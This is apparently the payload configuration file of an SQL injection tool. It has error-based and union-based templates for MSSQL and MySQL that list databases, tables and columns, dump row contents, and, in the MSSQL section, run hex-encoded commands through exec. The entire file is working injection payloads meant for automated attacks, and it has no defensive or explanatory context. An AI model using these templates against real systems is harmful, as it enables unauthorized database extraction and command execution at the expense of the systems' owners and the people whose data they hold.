;;;;;;;;MSSQL-SETTINGS;;;;;;;;
[mssql_error_based]
curr_db_name=(select ${MS}+cast(db_name() as varchar)+${MS})
dbs_count=(select top 1 ${MS}+cast(count(*) as varchar)+${MS} from master..sysdatabases)
get_db_name="(isnull((select top 1 ${MS}+cast(name as varchar)+${MS} from master..sysdatabases where name not in(''${current_db})), 0x7e69736e756c6c7e))"
get_db_name2="(isnull((select top 1 ${MS}+cast(name as varchar)+${MS} from master..sysdatabases where name not in(select top ${num} name from master..sysdatabases)), 0x7e69736e756c6c7e))"
tbls_count=(select top 1 ${MS}+cast(count(*) as varchar)+${MS} from [${current_db}].information_schema.tables)
get_tbl_name="(isnull((select top 1 ${MS}+cast(table_name as varchar)+${MS} from [${current_db}].information_schema.tables where table_name not in(''${current_table})), 0x7e69736e756c6c7e))"
get_tbl_name2=(select top 1 ${MS}+cast(table_name as varchar)+${MS} from [${current_db}].information_schema.tables where table_name not in(select top ${num} table_name from [${current_db}].information_schema.tables))
get_column_name="(isnull((select top 1 ${MS}+cast(column_name as varchar)+${MS} from [${current_db}].information_schema.columns where table_name=${current_table} and column_name not in(''${current_column})), 0x7e69736e756c6c7e))"
columns_count="(select top 1 ${MS}+cast(count(*) as varchar)+${MS} from [${current_db}].information_schema.columns where table_name=${current_table})"
get_column_name2="(select top 1 ${MS}+cast(column_name as varchar)+${MS} from [${current_db}].information_schema.columns where table_name=${current_table} and column_name not in(select top ${num} column_name from [${current_db}].information_schema.columns where table_name=${current_table}))"
get_column_name3="(select top 1 ${MS}+cast(column_name as varchar)+${MS} from [${current_db}].information_schema.columns where table_name=${current_table} and ordinal_position=${num})"
exec_cmdshell="declare @x varchar(8000) set @x=${hex}; exec (@x)"
get_row="(select top 1 isnull(${MS}+result+${MS},0x7e207e) from dtpropertie where num=${num})"
rows_count=(select top 1 ${MS}+cast(count(*) as varchar)+${MS} from [${current_db}]..[${selected_table}])
query="(select top 1 convert(int,${MS}+cast((${query_cmd}) as varchar(max))+${MS}))"
data_dump="(isnull((select top 1 convert(int,${MS}+cast((select ${column} from [${current_db}]..[${table}] where ${key}=${num} and len(${column})>=1) as varchar(max))+${MS})),0x4e554c4c))"

[mssql_union_based]
curr_db_name=${MS}+(select cast(db_name() as varchar))+${MS}
dbs_count=${MS}+(select cast(count(*) as nvarchar) from master..sysdatabases)+${MS}
get_db_name="${MS}+(isnull((select top 1 cast(name as varchar) from master..sysdatabases where name not in(''${current_db})),0x69736e756c6c))+${MS}"
get_db_name2="${MS}+(isnull((select top 1 cast(name as varchar) from master..sysdatabases where name not in(select top ${num} name from master..sysdatabases)),0x69736e756c6c))+${MS}"
tbls_count=${MS}+(select top 1 cast(count(*) as varchar) from [${current_db}].information_schema.tables)+${MS}
get_tbl_name="${MS}+(isnull((select top 1 cast(table_name as varchar) from [${current_db}].information_schema.tables where table_name not in(''${current_table})),0x69736e756c6c))+${MS}"
get_tbl_name2=${MS}+(select top 1 cast(table_name as varchar) from [${current_db}].information_schema.tables where table_name not in(select top ${num} table_name from [${current_db}].information_schema.tables))+${MS}
get_column_name="${MS}+(isnull((select top 1 cast(column_name as varchar) from [${current_db}].information_schema.columns where table_name=${current_table} and column_name not in(''${current_column})),0x69736e756c6c))+${MS}"
columns_count="${MS}+(select top 1 cast(count(*) as varchar) from [${current_db}].information_schema.columns where table_name=${current_table})+${MS}"
get_column_name2="${MS}+(select top 1 cast(column_name as varchar) from [${current_db}].information_schema.columns where table_name=${current_table} and column_name not in(select top ${num} column_name from [${current_db}].information_schema.columns where table_name=${current_table}))+${MS}"
get_column_name3="${MS}+(select top 1 cast(column_name as varchar) from [${current_db}].information_schema.columns where table_name=${current_table} and ordinal_position=${num})+${MS}"
get_row="${MS}+(select top 1 isnull(result,0x7e207e) from dtpropertie where num=${num})+${MS}"
rows_count=${MS}+(select top 1 cast(count(*) as varchar) from [${current_db}]..[${selected_table}])+${MS}
query="${MS}+(select cast((${query_cmd}) as varchar(max))+${MS})"
data_dump="${MS}+(isnull((select top 1 cast((select ${column} from [${current_db}]..[${table}] where ${key}=${num} and len(${column})>=1) as varchar(max))),0x4e554c4c))+${MS}"

;;;;;;;;MySQL-SETTINGS;;;;;;;;
[mysql_error_based]
curr_db_name="(select 1 from(select count(*),concat((concat(${MS},(select database()),${MS})),floor(rand(0)*2))x from information_schema.tables group by x)a)"
dbs_count="(select 1 from(select count(*),concat((concat(${MS},(select count(*) from mysql.db),${MS})),floor(rand(0)*2))x from information_schema.tables group by x)a)"
get_db_name="(select 1 from(select count(*),concat((concat(${MS},(select db from mysql.db limit ${num},1),${MS})),floor(rand(0)*2))x from information_schema.tables group by x)a)"
tbls_count="(select 1 from(select count(*),concat((concat(${MS},(select count(*) from information_schema.tables where table_schema=${current_db}),${MS})),floor(rand(0)*2))x from information_schema.tables group by x)a)"
get_tbl_name2="(select 1 from(select count(*),concat((concat(${MS},(select table_name from information_schema.tables where table_schema=${current_db} limit ${num},1),${MS})),floor(rand(0)*2))x from information_schema.tables group by x)a)"
columns_count="(select 1 from(select count(*),concat((concat(${MS},(select count(*) from information_schema.columns where table_schema=${current_db} and table_name=${current_table}),${MS})),floor(rand(0)*2))x from information_schema.tables group by x)a)"
get_column_name2="(select 1 from(select count(*),concat((concat(${MS},(select column_name from information_schema.columns where table_schema=${current_db} and table_name=${current_table} limit ${num},1),${MS})),floor(rand(0)*2))x from information_schema.tables group by x)a)"
get_column_name3="(select 1 from(select count(*),concat((concat(${MS},(select column_name from information_schema.columns where table_schema=${current_db} and table_name=${current_table} and ordinal_position=${num}),${MS})),floor(rand(0)*2))x from information_schema.tables group by x)a)"
rows_count="(select 1 from(select count(*),concat((concat(${MS},(select count(*) from ${current_db}.${selected_table}),${MS})),floor(rand(0)*2))x from information_schema.tables group by x)a)"
query="(select 1 from(select count(*),concat((concat(${MS},(${query_cmd}),${MS})),floor(rand(0)*2))x from information_schema.tables group by x)a)"
data_dump="(select 1 from(select count(*),concat((concat(${MS},(ifnull((select ${column} from ${current_db}.${table} where ${key}=${num} and length(${column})>=1),0x4e554c4c)),${MS})),floor(rand(0)*2))x from information_schema.tables group by x)a)"

[mysql_union_based]
curr_db_name="concat(${MS},(select database()),${MS})"
dbs_count="concat(${MS},(select count(*) from mysql.db),${MS})"
get_db_name2="concat(${MS},(select db from mysql.db limit ${num},1),${MS})"
tbls_count="concat(${MS},(select count(*) from information_schema.tables where table_schema=${current_db}),${MS})"
get_tbl_name2="concat(${MS},(select table_name from information_schema.tables where table_schema=${current_db} limit ${num},1),${MS})"
columns_count="concat(${MS},(select count(*) from information_schema.columns where table_schema=${current_db} and table_name=${current_table}),${MS})"
get_column_name2="concat(${MS},(select column_name from information_schema.columns where table_schema=${current_db} and table_name=${current_table} limit ${num},1),${MS})"
get_column_name3="concat(${MS},(select column_name from information_schema.columns where table_schema=${current_db} and table_name=${current_table} and ordinal_position=${num}),${MS})"
rows_count="concat(${MS},(select count(*) from ${current_db}.${selected_table}),${MS})"
query="concat(${MS},ifnull((${query_cmd}),char(78,85,76,76)),${MS})"
data_dump="concat(${MS},unhex(hex((ifnull((select ${column} from ${current_db}.${table} where ${key}=${num} and length(${column})>=1),0x4e554c4c)))),${MS})"